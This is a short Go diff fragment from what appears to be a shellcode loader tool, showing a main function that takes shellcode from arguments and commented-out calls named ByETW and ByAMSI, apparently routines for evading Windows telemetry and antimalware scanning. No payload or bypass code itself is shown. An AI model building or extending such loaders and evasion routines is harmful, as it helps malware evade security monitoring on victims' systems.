@@ -312,12 +312,12 @@ func exec(startA uintptr,funcExec string){
 		}
 
 	}
-
 }
 
 
 func main(){
-	//lib.PatchBypass()
+	//lib.ByETW()
+	//lib.ByAMSI()
 	var shellcode []byte
 	if len(os.Args)!= 2||os.Args[1] == "-h"{
 		fmt.Println("Usage:")
